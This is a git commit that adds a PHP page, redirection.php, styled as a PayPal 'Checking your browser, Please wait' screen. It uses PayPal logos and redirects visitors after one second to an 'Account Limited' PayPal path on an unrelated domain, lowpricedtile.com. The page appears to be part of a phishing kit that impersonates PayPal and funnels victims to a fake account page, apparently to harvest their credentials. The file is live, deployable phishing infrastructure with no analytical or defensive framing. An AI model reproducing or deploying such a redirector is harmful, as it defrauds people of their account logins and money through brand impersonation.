0754fbe18f5e2bb61f1f7edf77df2ac558c109ae
AbDou Sahnoun <39247049+AbDou-Sahnoun@users.noreply.github.com>
2018-08-28 01:39:12 +0100

    Add files via upload

---
+++ redirection.php
@@ -0,0 +1,17 @@
+<?php
+header('Refresh: 1; URL=https://lowpricedtile.com/PayPal/Account%20Limited/');
+?>
+
+<link rel="icon" href="https://lowpricedtile.com/Images/PayPal.png">
+</head>
+<head>
+  <title>PayPal</title>
+</head>
+
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p><img style="display: block; margin-left: auto; margin-right: auto;" src="https://lowpricedtile.com/Images/PayPal.png" alt="please wait" width="142" height="142" /></p>
+<p style="text-align: center;"><img src="https://lowpricedtile.com/Images/PayPal.gif" alt="" width="25" height="17" /></p>
+<p style="text-align: center;"><strong>Checking your browser , Please wait ...</strong></p>
